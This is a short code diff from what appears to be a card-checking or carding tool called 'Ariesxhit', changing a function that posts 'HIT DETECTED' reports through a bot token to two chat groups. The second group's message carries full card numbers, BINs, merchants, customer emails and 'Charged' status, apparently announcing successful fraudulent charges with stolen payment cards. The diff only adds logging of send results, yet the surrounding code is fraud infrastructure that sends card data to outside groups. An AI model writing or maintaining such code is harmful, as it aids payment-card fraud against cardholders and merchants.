@@ -519,8 +519,8 @@ async function sendHitToGroups(hitData, checkoutUrl) {
     if (GROUP_1) {
       const group1Message = `🎯 𝗛𝗜𝗧 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗\n─────────────────\n\nName :- ${userNameLink}\nAmount :- ${hitData.amount}\nAttempt :- ${hitData.attempts}\nTime :- ${hitData.timeTaken}\n\n─────────────────\nThanks For Using Ariesxhit. 💗`;
 
-      await sendMessage(BOT_TOKEN, GROUP_1, group1Message);
-      console.log('✅ Group notification sent to ARIESxHIT Chat');
+      const group1Result = await sendMessage(BOT_TOKEN, GROUP_1, group1Message);
+      console.log('✅ Group notification sent to ARIESxHIT Chat, result:', group1Result);
     }
 
     // Send to GROUP_2 (Aries Hits) - Detailed format
@@ -529,8 +529,8 @@ async function sendHitToGroups(hitData, checkoutUrl) {
       const binSource = hitData.binMode || '';
       const group2Message = `🎯 𝗛𝗜𝗧 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗\n─────────────────\n\n「❃」 Name :- ${userNameLink}\n「❃」 Card :- ${hitData.card}\n「❃」 Bin :- ${bin}${binSource}\n「❃」 Merchant :- ${hitData.merchant}\n「❃」 Email :- ${hitData.email || 'Unknown'}\n「❃」 Amount :- ${hitData.amount}\n「❃」 Response : Charged\n「❃」 Attempt :- ${hitData.attempts}\n「❃」 Time :- ${hitData.timeTaken}\n\n─────────────────\nThanks For Using Ariesxhit. 💗`;
 
-      await sendMessage(BOT_TOKEN, GROUP_2, group2Message);
-      console.log('✅ Group notification sent to Aries Hits');
+      const group2Result = await sendMessage(BOT_TOKEN, GROUP_2, group2Message);
+      console.log('✅ Group notification sent to Aries Hits, result:', group2Result);
     }
 
     console.log('🎉 All group notifications sent successfully!');
